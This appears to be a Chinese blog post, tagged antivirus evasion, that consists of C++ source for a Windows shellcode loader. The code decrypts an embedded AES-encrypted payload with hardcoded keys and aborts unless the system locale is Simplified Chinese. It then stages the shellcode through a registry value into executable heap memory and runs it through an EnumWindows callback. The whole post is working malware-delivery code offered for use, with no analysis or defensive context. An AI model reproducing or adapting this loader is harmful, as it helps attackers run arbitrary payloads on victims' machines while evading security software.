---
title: reg shellcode加载器
date: 2022-02-20
categories: ["免杀"]
tags: []
---

```

#define _CRT_SECURE_NO_DEPRECATE

#include "Base64.h"
#include "AES.h"
#include <Windows.h>
#include <stdio.h>
#include <Winnls.h>

#pragma comment(lib,"Kernel32.lib")
#include <iostream>
using namespace std;
#define BUF_SIZE 4096

HKEY hKey;
HKEY rootKey = HKEY_CURRENT_USER;
DWORD cbData;



static BOOL CALLBACK EnumWindowCallback(HWND hWnd, LPARAM lparam) {
    //printf("%S", lparam);
    return true;
}

const char g_key[17] = "asdfwetyhjuytrfd";
const char g_iv[17] = "gfdertfghjkuyrtg";//ECB MODE不需要关心chain，可以填空

string DecryptionAES(const string& strSrc) //AES解密
{
	string strData = base64_decode(strSrc);
	size_t length = strData.length();
	//密文
	char* szDataIn = new char[length + 1];
	memcpy(szDataIn, strData.c_str(), length + 1);
	//明文
	char* szDataOut = new char[length + 1];
	memcpy(szDataOut, strData.c_str(), length + 1);

	//进行AES的CBC模式解密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

	//去PKCS7Padding填充
	if (0x00 < szDataOut[length - 1] <= 0x16)
	{
		int tmp = szDataOut[length - 1];
		for (int i = length - 1; i >= length - tmp; i--)
		{
			if (szDataOut[i] != tmp)
			{
				memset(szDataOut, 0, length);
				cout << "decode error" << endl;
				break;
			}
			else
				szDataOut[i] = 0;
		}
	}
	string strDest(szDataOut);
	delete[] szDataIn;
	delete[] szDataOut;
	return strDest;
}

int main()
{
	// check languge
    LANGID test_id = GetSystemDefaultLangID();

    if (test_id != 0x0804)
    {
        exit(0);
    }

	// 加密后的shellcode
	char buf[BUF_SIZE] = "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";

	// 解密shellcode
	string strbuf = DecryptionAES(buf);
	//cout << "解密后shellcode：" << strbuf << endl;
	char buff[BUF_SIZE] = { 0 };
	for (int i = 0; i < strbuf.length(); i++) {
		buff[i] = strbuf[i];
	}

	// shellcode 处理，两个两个一起，还原成 \x00 的样子
	char* p = buff;
	unsigned char* shellcode = (unsigned char*)calloc(strlen(buff) / 2, sizeof(unsigned char));
	for (size_t i = 0; i < strlen(buff) / 2; i++) {
		sscanf(p, "%2hhx", &shellcode[i]);
		p += 2;
	}

	

	SIZE_T bufSize = strlen(buff) / 2;

	printf("Decrypted buffer:\n");
	for (int i = 0; i < bufSize; i++) {
		printf("\\x%02x", shellcode[i]);
	}


    LSTATUS a = RegSetValueExA(rootKey, "HelloTest", 0, 3, shellcode, bufSize);

    HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    BYTE* exec = (BYTE*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, 0);


    LSTATUS b = RegQueryValueExA(rootKey, "HelloTest", 0, 0, 0, &cbData);
    LSTATUS c = RegQueryValueExA(rootKey, "HelloTest", 0, 0, exec, &cbData);
    if (c == ERROR_SUCCESS) {

        
        //EnumSystemLocalesA((LOCALE_ENUMPROCA)exec, 0);
       // EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)exec, LGRPID_SUPPORTED, 0);


        EnumWindows((WNDENUMPROC)exec, NULL);
        CloseHandle(exec);

    }
}
```